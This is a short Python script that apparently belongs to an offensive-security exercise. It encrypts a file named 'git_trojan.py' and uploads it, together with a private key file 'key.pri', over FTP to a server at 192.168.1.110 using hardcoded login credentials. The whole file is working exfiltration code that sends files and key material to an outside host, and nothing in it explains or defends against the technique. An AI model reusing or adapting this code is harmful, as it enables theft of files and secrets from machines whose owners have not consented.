import ftplib
import os
import socket
import win32file

import cryptor

def plain_ftp(docpath, server='192.168.1.110'):
    ftp = ftplib.FTP(server)

    ftp.login("nine", "nine")
    ftp.cwd('./pub')

    ftp.storbinary("STOR " + os.path.basename(docpath), open(docpath, "rb"), 1024)
    ftp.quit()


with open("git_trojan.py", "rb") as f1:
    file = f1.read()

with open("git_trojan_encrypted", "wb") as f2:
    f2.write(cryptor.encrypt(file))

plain_ftp("git_trojan_encrypted")
plain_ftp("key.pri")